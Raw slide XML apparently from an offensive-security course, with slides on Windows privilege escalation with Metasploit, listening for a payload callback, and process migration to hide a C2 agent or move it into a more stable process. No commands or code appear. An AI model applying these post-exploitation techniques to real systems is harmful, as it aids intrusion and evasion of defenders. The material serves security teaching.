              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="931" name="Google Shape;931;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6188675" y="2054435"/>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Start the service and listen for the payload callback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in Metasploit.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">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t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4398800"/>
            <a:ext cx="8703600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>15 minutes</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="937" name="Google Shape;937;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="818575" y="1726975"/>
            <a:ext cx="5612100" cy="21162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800"/>
              <a:t>In this activity, you will implement a privilege escalation attack path with Metasploit.</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="938" name="Google Shape;938;p109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="3231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sz="1800"/>
              <a:t>Windows privilege escalation</a:t>
            </a:r>
            <a:endParaRPr sz="18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954" name="Shape 954"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="955" name="Google Shape;955;p113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2550800"/>
            <a:ext cx="9144000" cy="7407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lang="en" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Process Migration</a:t>
            </a:r>
            <a:endParaRPr sz="4000">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="956" name="Google Shape;956;p113"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3831340" y="1605051"/>
            <a:ext cx="1481308" cy="907712"/>
            <a:chOff x="293125" y="702425"/>
            <a:chExt cx="7033750" cy="4310125"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="957" name="Google Shape;957;p113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="293125" y="702425"/>
              <a:ext cx="7033750" cy="4310125"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="172405" w="281350">
                  <a:moveTo>
                    <a:pt x="184876" y="30080"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="57958" y="30080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57958" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="58325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57958" y="116281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57958" y="86203"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84735" y="86203"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84735" y="86203"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196615" y="86203"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223392" y="86203"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223392" y="56124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281349" y="114447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223392" y="172404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223392" y="142325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96474" y="142325"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4915025" y="1105925"/>
              <a:ext cx="706150" cy="696975"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="27879" w="28246">
                  <a:moveTo>
                    <a:pt x="28245" y="13940"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="28245" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27878" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27145" y="19442"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26044" y="22010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24210" y="23844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22009" y="25678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19808" y="26778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="27879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="27879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="27879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="27879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="26778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="25678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="23844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="22010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="19442"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19808" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22009" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24210" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26044" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27145" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27878" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28245" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28245" y="13940"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3154300" y="1885425"/>
              <a:ext cx="541075" cy="541075"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="21643" w="21643">
                  <a:moveTo>
                    <a:pt x="21643" y="11005"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="21643" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21643" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20909" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19809" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18708" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="19808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="20909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="21642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="21642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="21642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="21642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="20909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="19808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18708" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19809" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20909" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21643" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21643" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21643" y="11005"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2063025" y="2160525"/>
              <a:ext cx="1091300" cy="25"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="1" w="43652">
                  <a:moveTo>
                    <a:pt x="43652" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="1"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1998825" y="3912075"/>
              <a:ext cx="706150" cy="706150"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="28246" w="28246">
                  <a:moveTo>
                    <a:pt x="1" y="13939"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19442" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22010" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24211" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25678" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27145" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27879" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28246" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28246" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27879" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27145" y="19441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25678" y="22009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24211" y="23843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22010" y="25677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19442" y="27145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="27878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="28245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="28245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="27878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="27145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="25677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="23843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="22009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="19441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="13939"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3924625" y="3288475"/>
              <a:ext cx="541075" cy="541075"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="21643" w="21643">
                  <a:moveTo>
                    <a:pt x="0" y="11005"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18341" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19808" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20909" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21276" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21642" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21642" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21276" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20909" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19808" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18341" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="19809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="20909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="21643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="21643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="21643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="21643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="20909"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="19809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11005"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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113"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4465675" y="3563600"/>
              <a:ext cx="1091300" cy="25"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="1" w="43652">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="43652" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln cap="rnd"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114"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3145525" y="1328400"/>
            <a:ext cx="5720700" cy="248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Once we are SYSTEM and have full access to the machine, we can explore </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>process migration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</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p115"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1758700" y="1039700"/>
            <a:ext cx="6156900" cy="31317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b="1" lang="en" sz="2400">
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Process migration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2400"/>
              <a:t>, or </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>process injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2400"/>
              <a:t>, means moving the active process of the </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="2400"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="2400"/>
              <a:t>C2 agent to another active process. Essentially, it allows a current process to “inject” or “migrate” its data into another process. The old process takes the name </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="2400"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="2400"/>
              <a:t>of the new, migrated process.</a:t>
            </a:r>
            <a:endParaRPr sz="900"/>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116"/>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Process Migration</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="979" name="Google Shape;979;p116"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1116120" y="1042975"/>
            <a:ext cx="6911760" cy="3571076"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="980" name="Google Shape;980;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709125" y="1994275"/>
            <a:ext cx="2257200" cy="1721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sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>To </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>conceal </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>the identity of a C2 agent</a:t>
            </a:r>
            <a:endParaRPr i="0" sz="2400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="981" name="Google Shape;981;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5175625" y="1994275"/>
            <a:ext cx="2338200" cy="1721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sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>To </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>move</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> to a more stable process</a:t>
            </a:r>
            <a:endParaRPr i="0" sz="2400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="982" name="Google Shape;982;p116"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="515275"/>
            <a:ext cx="9192600" cy="3231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There are two primary purposes for process migration:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
